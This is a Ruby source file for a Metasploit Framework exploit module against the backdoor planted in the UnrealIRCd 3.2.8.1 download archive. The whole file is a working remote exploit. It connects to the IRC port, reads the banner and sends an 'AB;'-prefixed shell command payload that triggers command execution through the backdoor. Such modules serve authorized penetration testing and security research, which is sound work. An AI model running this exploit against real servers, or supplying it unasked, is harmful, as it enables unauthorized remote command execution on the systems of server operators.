##
# $Id: unreal_ircd_3281_backdoor.rb 9503 2010-06-12 19:25:48Z hdm $
##
##
# This file is part of the Metasploit Framework and may be subject to redistribution and commercial restrictions. Please see the Metasploit Framework
# web site for more information on licensing and terms of use. http://metasploit.com/framework/
##
require 'msf/core' class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			'Name' => 'UnrealIRCD 3.2.8.1 Backdoor Command Execution',
			'Description' => %q{
				This module uses exploits a malicious backdoor that was added to the
			Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the
			Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.
			},
			'Author' => [ 'hdm' ],
			'License' => MSF_LICENSE,
			'Version' => '$Revision: 9503 $',
			'References' =>
				[
					[ 'URL', 'http://seclists.org/fulldisclosure/2010/Jun/277'],
				],
			'Platform' => ['unix'],
			'Arch' => ARCH_CMD,
			'Privileged' => false,
			'Payload' =>
				{
					'Space' => 1024,
					'DisableNops' => true,
					'Compat' =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Targets' =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget' => 0))
			register_options(
				[
					Opt::RPORT(6667)
				], self.class)
	end
	def exploit
		connect
		print_status("Connected to #{rhost}:#{rport}...")
		banner = sock.get_once(-1, 30)
		banner.to_s.split("\n").each do |line|
			print_line(" #{line}")
		end
		print_status("Sending backdoor command...")
		sock.put("AB;" + payload.encoded + "\n")
		handler
		disconnect
	end end
